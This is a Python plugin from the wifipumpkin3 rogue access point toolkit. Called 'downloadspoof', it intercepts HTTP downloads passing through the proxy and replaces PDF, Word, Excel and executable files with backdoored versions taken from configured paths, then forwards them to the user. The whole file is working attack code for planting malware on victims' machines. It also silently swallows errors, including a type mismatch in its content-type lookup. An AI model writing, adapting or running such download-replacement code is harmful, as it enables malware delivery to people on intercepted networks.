from wifipumpkin3.plugins.pumpkinproxy.base import BasePumpkin
from os import path

# This file is part of the wifipumpkin3 Open Source Project.
# wifipumpkin3 is licensed under the Apache 2.0.

# Copyright 2020 P0cL4bs Team - Marcos Bomfim (mh4x0f)

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


exe_mimetypes = [
    "application/octet-stream",
    "application/x-msdownload",
    "application/exe",
    "application/x-exe",
    "application/dos-exe",
    "vms/exe",
    "application/x-winexe",
    "application/msdos-windows",
    "application/x-msdos-program",
]


class downloadspoof(BasePumpkin):

    meta = {
        "_name": "downloadspoof",
        "_version": "1.0",
        "_description": "replace download content-type for another binary malicius",
        "_author": "Marcos Nesster",
    }

    @staticmethod
    def getName():
        return downloadspoof.meta["_name"]

    def __init__(self):
        for key, value in self.meta.items():
            self.__dict__[key] = value
        self.ConfigParser = True
        self.payloads = {
            "application/pdf": self._config.get("set_downloadspoof", "backdoorPDFpath"),
            "application/msword": self._config.get(
                "set_downloadspoof", "backdoorWORDpath"
            ),
            "application/x-msexcel": self._config.get(
                "set_downloadspoof", "backdoorXLSpath"
            ),
        }
        for mime in exe_mimetypes:
            self.payloads[mime] = self._config.get(
                "set_downloadspoof", "backdoorExePath"
            )

    def handleResponse(self, request, data):
        try:
            # for another format file types
            content = request.responseHeaders.getRawHeaders("content-type")
            if content in self.payloads:
                if path.isfile(self.payloads[content]):
                    print("[downloadspoof]:: URL: {}".format(request.uri))
                    print(
                        "[downloadspoof]:: Replaced file of mimtype {} with malicious version".format(
                            content
                        )
                    )
                    data = open(self.payloads[content], "rb").read()
                    print("[downloadspoof]:: Patching complete, forwarding to user...")
                    return data
                print(
                    "[downloadspoof]:: {}, Error Path file not found\n".format(
                        self.payloads[content]
                    )
                )
        except Exception as e:
            pass

        return data

    def handleHeader(self, request, key, value):
        return key, value
